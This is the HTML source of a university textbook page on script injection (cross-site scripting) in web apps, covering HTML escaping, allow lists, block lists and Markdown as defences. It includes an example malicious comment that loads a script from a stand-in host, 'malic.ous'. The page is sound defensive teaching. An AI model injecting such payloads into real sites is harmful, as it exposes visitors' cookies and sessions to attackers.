<!doctype html><html lang=en-us dir=ltr itemscope itemtype=http://schema.org/Article><head><meta charset=utf-8><meta name=viewport content="height=device-height,width=device-width,initial-scale=1,minimum-scale=1"><meta name=generator content="Hugo 0.128.0"><meta name=generator content="Relearn 6.0.0"><meta name=description content='Whenever we render content created by users, we open the door to script injection, a kind of attack where a malicious user adds script tags to the content they are posting. Consider this form:
<form action="post"> <label for="comment"> <textarea name="comment"></textarea> </label> <input type="submit"/> </form>The intent is to allow the user to post comments on the page. But a malicious user could enter something like:
What an awesome site <script src="http://malic.ous/dangerous-script.js"></script>If we concatenate this string directly into the webpage, we will serve the <script> tag the user included, which means that dangerous-script.'><meta name=author content="Nathan Bean"><meta name=twitter:card content="summary"><meta name=twitter:title content="Script Injection :: CIS 526 Textbook"><meta name=twitter:description content='Whenever we render content created by users, we open the door to script injection, a kind of attack where a malicious user adds script tags to the content they are posting. Consider this form:
<form action="post"> <label for="comment"> <textarea name="comment"></textarea> </label> <input type="submit"/> </form>The intent is to allow the user to post comments on the page. But a malicious user could enter something like:
What an awesome site <script src="http://malic.ous/dangerous-script.js"></script>If we concatenate this string directly into the webpage, we will serve the <script> tag the user included, which means that dangerous-script.'><meta property="og:url" content="https://textbooks.cs.ksu.edu/cis526/06-dynamic-web-servers/11-script-injection/"><meta property="og:site_name" content="CIS 526 Textbook"><meta property="og:title" content="Script Injection :: CIS 526 Textbook"><meta property="og:description" content='Whenever we render content created by users, we open the door to script injection, a kind of attack where a malicious user adds script tags to the content they are posting. Consider this form:
<form action="post"> <label for="comment"> <textarea name="comment"></textarea> </label> <input type="submit"/> </form>The intent is to allow the user to post comments on the page. But a malicious user could enter something like:
What an awesome site <script src="http://malic.ous/dangerous-script.js"></script>If we concatenate this string directly into the webpage, we will serve the <script> tag the user included, which means that dangerous-script.'><meta property="og:locale" content="en-us"><meta property="og:type" content="article"><meta property="article:section" content="Dynamic Web Servers"><meta property="article:published_time" content="2018-08-24T10:53:26-05:00"><meta property="article:modified_time" content="2021-07-01T14:13:35-05:00"><meta itemprop=name content="Script Injection :: CIS 526 Textbook"><meta itemprop=description content='Whenever we render content created by users, we open the door to script injection, a kind of attack where a malicious user adds script tags to the content they are posting. Consider this form:
<form action="post"> <label for="comment"> <textarea name="comment"></textarea> </label> <input type="submit"/> </form>The intent is to allow the user to post comments on the page. But a malicious user could enter something like:
What an awesome site <script src="http://malic.ous/dangerous-script.js"></script>If we concatenate this string directly into the webpage, we will serve the <script> tag the user included, which means that dangerous-script.'><meta itemprop=datePublished content="2018-08-24T10:53:26-05:00"><meta itemprop=dateModified content="2021-07-01T14:13:35-05:00"><meta itemprop=wordCount content="658"><title>Script Injection :: CIS 526 Textbook</title>
<link href=https://textbooks.cs.ksu.edu/cis526/06-dynamic-web-servers/11-script-injection/ rel=canonical type=text/html title="Script Injection :: CIS 526 Textbook"><link href=/cis526/06-dynamic-web-servers/11-script-injection/index.xml rel=alternate type=application/rss+xml title="Script Injection :: CIS 526 Textbook"><link href=/cis526/06-dynamic-web-servers/11-script-injection/tele.html rel=alternate type=text/html title="Script Injection :: CIS 526 Textbook"><link href=/cis526/06-dynamic-web-servers/11-script-injection/embed.html rel=alternate type=text/html title="Script Injection :: CIS 526 Textbook"><link href=/cis526/css/fontawesome-all.min.css?1745849812 rel=stylesheet media=print onload='this.media="all",this.onload=null'><noscript><link href=/cis526/css/fontawesome-all.min.css?1745849812 rel=stylesheet></noscript><link href=/cis526/css/nucleus.css?1745849812 rel=stylesheet><link href=/cis526/css/auto-complete.css?1745849812 rel=stylesheet media=print onload='this.media="all",this.onload=null'><noscript><link href=/cis526/css/auto-complete.css?1745849812 rel=stylesheet></noscript><link href=/cis526/css/perfect-scrollbar.min.css?1745849812 rel=stylesheet><link href=/cis526/css/fonts.css?1745849812 rel=stylesheet media=print onload='this.media="all",this.onload=null'><noscript><link href=/cis526/css/fonts.css?1745849812 rel=stylesheet></noscript><link href=/cis526/css/theme.css?1745849812 rel=stylesheet><link href=/cis526/css/theme-auto.css?1745849812 rel=stylesheet id=R-variant-style><link href=/cis526/css/chroma-auto.css?1745849812 rel=stylesheet id=R-variant-chroma-style><link href=/cis526/css/variant.css?1745849812 rel=stylesheet><link href=/cis526/css/print.css?1745849812 rel=stylesheet media=print><link href=/cis526/css/format-print.css?1745849812 rel=stylesheet><script src=/cis526/js/variant.js?1745849812></script><script>window.relearn=window.relearn||{},window.relearn.relBasePath="../..",window.relearn.relBaseUri="../../..",window.relearn.absBaseUri="https://textbooks.cs.ksu.edu/cis526",window.index_js_url="/cis526/index.search.js",window.variants&&variants.init(["auto","light-theme","dark-theme"]),window.T_Copy_to_clipboard=`Copy to clipboard`,window.T_Copied_to_clipboard=`Copied to clipboard!`,window.T_Copy_link_to_clipboard=`Copy link to clipboard`,window.T_Link_copied_to_clipboard=`Copied link to clipboard!`,window.T_Reset_view=`Reset view`,window.T_View_reset=`View reset!`,window.T_No_results_found=`No results found for "{0}"`,window.T_N_results_found=`{1} results found for "{0}"`</script><link href=/cis526/css/custom.css?1745849812 rel=stylesheet></head><body class="mobile-support print disableInlineCopyToClipboard" data-url=/cis526/06-dynamic-web-servers/11-script-injection/><div id=R-body class=default-animation><div id=R-body-overlay></div><nav id=R-topbar><div class=topbar-wrapper><div class=topbar-sidebar-divider></div><div class="topbar-area topbar-area-start" data-area=start><div class="topbar-button topbar-button-sidebar" data-content-empty=disable data-width-s=show data-width-m=hide data-width-l=hide><button class=topbar-control onclick=toggleNav() type=button title="Menu (CTRL+ALT+n)"><i class="fa-fw fas fa-bars"></i></button></div></div><ol class="topbar-breadcrumbs breadcrumbs highlightable" itemscope itemtype=http://schema.org/BreadcrumbList><li itemscope itemtype=https://schema.org/ListItem itemprop=itemListElement><a itemprop=item href=/cis526/06-dynamic-web-servers/><span itemprop=name>Dynamic Web Servers</span></a><meta itemprop=position content="1">&nbsp;>&nbsp;</li><li itemscope itemtype=https://schema.org/ListItem itemprop=itemListElement><span itemprop=name>Script Injection</span><meta itemprop=position content="2"></li></ol><div class="topbar-area topbar-area-end" data-area=end><div class="topbar-button topbar-button-prev" data-content-empty=disable data-width-s=show data-width-m=show data-width-l=show><a class=topbar-control href=/cis526/06-dynamic-web-servers/10-template-rendering/ title="Template Rendering (ðŸ¡)"><i class="fa-fw fas fa-chevron-left"></i></a></div><div class="topbar-button topbar-button-next" data-content-empty=disable data-width-s=show data-width-m=show data-width-l=show><a class=topbar-control href=/cis526/06-dynamic-web-servers/12-full-stack/ title="Full Stack Development (ðŸ¡’)"><i class="fa-fw fas fa-chevron-right"></i></a></div></div></div></nav><div id=R-main-overlay></div><main id=R-body-inner class="highlightable default" tabindex=-1><div class=flex-block-wrapper><article class=default><header class=headline></header><h1 id=script-injection>Script Injection</h1><p>Whenever we render content created by users, we open the door to <em>script injection</em>, a kind of attack where a malicious user adds script tags to the content they are posting. Consider this form:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>form</span> <span class=na>action</span><span class=o>=</span><span class=s>&#34;post&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>   <span class=p>&lt;</span><span class=nt>label</span> <span class=na>for</span><span class=o>=</span><span class=s>&#34;comment&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>textarea</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;comment&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>textarea</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;/</span><span class=nt>label</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;submit&#34;</span><span class=p>/&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>form</span><span class=p>&gt;</span></span></span></code></pre></div><p>The intent is to allow the user to post comments on the page. But a malicious user could enter something like:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl>What an awesome site <span class=p>&lt;</span><span class=nt>script</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;http://malic.ous/dangerous-script.js&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>script</span><span class=p>&gt;</span></span></span></code></pre></div><p>If we concatenate this string directly into the webpage, we will serve the <code>&lt;script></code> tag the user included, which means that <em>dangerous-script.js</em> will run on our page! That means it can potentially access our site&rsquo;s cookies, and make AJAX requests from our site. This script will run on the page for <em>all</em> visitors!</p><p>This attack is known as <a href=https://www.softwaretestinghelp.com/javascript-injection-tutorial/ rel=external target=_blank>script injection</a>, and is something you <strong>MUST</strong> prevent. So how can we prevent it? There are several strategies:</p><ol><li>HTML Escaping</li><li>Block Lists</li><li>Allow Lists</li><li>Markdown or other Markup Languages</li></ol><h3 id=html-escaping>HTML Escaping</h3><p>The simplest is to &ldquo;escape&rdquo; html tags by replacing the <code>&lt;</code> and <code>></code> characters with their html code equivalents, <code>&amp;lt;</code> (less than symbol) and <code>&amp;gt;</code> (greater than symbol). By replacing the opening and closing brackets with the equivalent HTML code, the browser will render the tags as ordinary strings, instead of as HTML. Thus, the above example will render on the page as:</p><blockquote><p>What an awesome site &lt;script src=&ldquo;<a href="http://malic.ous/dangerous-script.js%22></script" rel=external target=_blank>http://malic.ous/dangerous-script.js">&lt;/script</a>></p></blockquote><p>This can be accomplished in JavaScript with the <a href=https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace rel=external target=_blank>String.prototype.replace()</a> method:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nx>sanitizedHtmlString</span> <span class=o>=</span> <span class=nx>htmlString</span><span class=p>.</span><span class=nx>replace</span><span class=p>(</span><span class=sr>/&lt;/g</span><span class=p>,</span> <span class=s1>&#39;&amp;lt;&#39;</span><span class=p>).</span><span class=nx>replace</span><span class=p>(</span><span class=sr>/&gt;/g</span><span class=p>,</span> <span class=s1>&#39;&amp;gt&#39;</span><span class=p>);</span></span></span></code></pre></div><p>The <code>replace()</code> method takes either a regular expression or string to search for - and a string to replace the occurrences with. Here we use regular expressions with the global flag, so that <em>all</em> occurrences will be replaced. We also take advantage of the fact that it returns the modified string to do <a href=https://en.wikipedia.org/wiki/Method_chaining rel=external target=_blank>method chaining</a>, invoking a second <code>replace()</code> call on the string returned from the first call.</p><p>The downside to this approach is that <em>all</em> html in the string is reinterpreted as plain text. This means our comments won&rsquo;t support HTML codes like <code>&lt;b></code> and <code>&lt;i></code>, limiting the ability of users to customize their responses.</p><h3 id=allow-lists>Allow Lists</h3><p>Allow lists (also called &ldquo;whitelists&rdquo;) are a technique to allow only certain tags to be embedded into the page. This approach is more involved, as we must first <em>parse</em> the HTML string the same way a browser would to determine what tags it contains, and then remove any tags that don&rsquo;t appear in our allow list.</p><p>Instead of writing your own code to do this, it is common practice to use a well-maintained and tested open-source library. For example, the NPM package <a href=https://www.npmjs.com/package/sanitize-html rel=external target=_blank>sanitize-html</a> provides this ability.</p><h3 id=block-lists>Block Lists</h3><p>Block lists (also called &ldquo;blacklists&rdquo;) are a similar technique, but rather than specifying a list of <em>allowed</em> tags, you specify a list of <em>disallowed</em> tags. These are then stripped from html strings. This approach is slightly less robust, as new tags are added to the HTML standard will need to be evaluated and potentially added to the block list.</p><h3 id=markdown-or-other-markup-languages>Markdown or other Markup Languages</h3><p>A final option is to have users write their contributions using Markdown or another markup language which is transformed <em>into</em> JavaScript. Markdown (used by GitHub and many other websites) is probably the best-known of these, and provides equivalents to bold, italic, headings, links, and images:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-md data-lang=md><span class=line><span class=cl><span class=gh># This is transformed into a h1 element 
</span></span></span><span class=line><span class=cl><span class=gh></span><span class=gu>## This is transformed into a h2 element
</span></span></span><span class=line><span class=cl><span class=gu></span><span class=k>&gt; </span><span class=ge>This is transformed into a blockquote 
</span></span></span><span class=line><span class=cl><span class=ge></span>_this is italicized_ <span class=ge>*as is this*</span>
</span></span><span class=line><span class=cl><span class=gs>__this is bold__</span> <span class=gs>**as is this**</span>
</span></span><span class=line><span class=cl><span class=k>*</span> this
</span></span><span class=line><span class=cl><span class=k>*</span> is
</span></span><span class=line><span class=cl><span class=k>*</span> an 
</span></span><span class=line><span class=cl><span class=k>*</span> unordered 
</span></span><span class=line><span class=cl><span class=k>*</span> list
</span></span><span class=line><span class=cl><span class=k>1.</span> this
</span></span><span class=line><span class=cl><span class=k>2.</span> is 
</span></span><span class=line><span class=cl><span class=k>3.</span> a 
</span></span><span class=line><span class=cl><span class=k>4.</span> numbered
</span></span><span class=line><span class=cl>5. list</span></span></code></pre></div><p>As it does not have conversions for <code>&lt;script></code> and other dangerous tags, HTML generated from it is relatively &ldquo;safe&rdquo; (it is still necessary to escape HTML in the original markup string though).</p><p>As with allow/block lists, Markdown and the like are usually processed with an outside library, like <a href=https://www.npmjs.com/package/markdown rel=external target=_blank>markdown-js</a>. There are similar libraries for most modern programming languages.</p><footer class=footline></footer></article></div></main><div class=git-footer><p class=theme-version-footer>6.0.0</p><p>Last modified by:
<i class='fas fa-user'></i> Nathan Bean
<i class='fas fa-calendar'></i> <a href=https://github.com/ksu-cs-textbooks/cis526/commit/2cb0784f2c522fd7f6291c275c25a75e6d7e2768>Jul 1, 2021</a></p></div></div><script src=/cis526/js/clipboard.min.js?1745849812 defer></script><script src=/cis526/js/perfect-scrollbar.min.js?1745849812 defer></script><script src=/cis526/js/theme.js?1745849812 defer></script></body></html>